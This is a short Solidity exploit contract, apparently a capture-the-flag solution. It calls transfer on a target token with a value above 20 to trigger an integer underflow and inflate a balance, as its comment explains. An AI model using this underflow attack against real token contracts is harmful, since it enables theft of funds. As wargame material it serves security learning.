// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Here it is enough to send some amount that is more than 20 to cause underflow
// Address to send the tokens to can be any valid address

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract Caller {
    IToken token;
    constructor(address _token) public {
        token = IToken(_token);
    }

    function getRights(address _to, uint256 _value) external {
        token.transfer(_to, _value);
    }

    function getBalance() external view returns (uint256) {
        uint256 balance = token.balanceOf(address(this));
        return balance;
    }

    receive() external payable {}

}
